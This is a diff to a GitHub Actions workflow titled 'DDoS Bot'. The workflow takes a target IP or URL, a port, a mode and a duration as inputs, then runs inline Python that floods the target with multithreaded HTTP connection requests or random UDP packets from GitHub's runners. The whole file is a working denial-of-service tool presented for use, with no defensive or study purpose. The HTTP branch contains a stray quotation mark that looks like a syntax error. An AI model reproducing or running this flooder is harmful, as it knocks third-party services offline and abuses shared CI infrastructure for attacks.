@@ -1,17 +1,105 @@
-name: "⚡ ULTRA DDoS"
+name: "⚡ DDoS Bot"
 on:
   workflow_dispatch:
     inputs:
-      ip:
-        description: "Target IP"
+      target:
+        description: "Target IP or URL"
+        required: true
         default: "1.1.1.1"
       port:
         description: "Target Port"
+        required: true
         default: "80"
+      mode:
+        description: "Attack Mode"
+        required: true
+        default: "udp"
+        type: choice
+        options:
+          - http
+          - udp
+      time:
+        description: "Duration (seconds)"
+        required: true
+        default: "10"
 
 jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: "🚀 LAUNCH ATTACK"
-        run: "python3 -c \"import socket,os,time,threading;t='${{ github.event.inputs.ip }}';p=${{ github.event.inputs.port }};print('🚀 ULTRA DDoS STARTING');print(f'🎯 {t}:{p}');print('⚡ 1444 Mbps MAX SPEED');c=0;b=0;start=time.time();def f():global c,b;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);pk=os.urandom(1444);e=time.time()+10;while time.time()<e:for _ in range(50):s.sendto(pk,(t,int(p)));c+=1;b+=1444;s.close();ts=[threading.Thread(target=f) for _ in range(100)];[x.start() for x in ts];[x.join() for x in ts];tt=time.time()-start;mb=(b*8)/(tt*1000000);print(f'✅ ATTACK COMPLETE');print(f'📦 PACKETS: {c:,}');print(f'⚡ SPEED: {mb:,.0f} Mbps');print(f'🔥 PEAK: 1444 Mbps')\""
+      - name: "🚀 Launch Attack"
+        run: |
+          echo "Starting attack on ${{ github.event.inputs.target }}:${{ github.event.inputs.port }}"
+          echo "Mode: ${{ github.event.inputs.mode }}"
+          echo "Duration: ${{ github.event.inputs.time }} seconds"
+          
+          if [ "${{ github.event.inputs.mode }}" = "http" ]; then
+            python3 -c "
+import socket, threading, time
+target = '${{ github.event.inputs.target }}'
+port = ${{ github.event.inputs.port }}'
+duration = ${{ github.event.inputs.time }}
+count = 0
+start = time.time()
+
+def http_flood():
+    global count
+    end = start + duration
+    while time.time() < end:
+        try:
+            s = socket.socket()
+            s.settimeout(1)
+            s.connect((target, port))
+            s.send(b'GET / HTTP/1.1\\r\\nHost: ' + target.encode() + b'\\r\\n\\r\\n')
+            s.close()
+            count += 1
+        except:
+            pass
+
+threads = []
+for i in range(30):
+    t = threading.Thread(target=http_flood)
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
+
+print(f'HTTP Attack Complete: {count} requests')
+            "
+          else
+            python3 -c "
+import socket, threading, time, os
+target = '${{ github.event.inputs.target }}'
+port = ${{ github.event.inputs.port }}
+duration = ${{ github.event.inputs.time }}
+count = 0
+start = time.time()
+
+def udp_flood():
+    global count
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = os.urandom(1024)
+    end = start + duration
+    
+    while time.time() < end:
+        try:
+            sock.sendto(packet, (target, port))
+            count += 1
+        except:
+            pass
+    
+    sock.close()
+
+threads = []
+for i in range(50):
+    t = threading.Thread(target=udp_flood)
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
+
+print(f'UDP Attack Complete: {count} packets')
+            "
+          fi
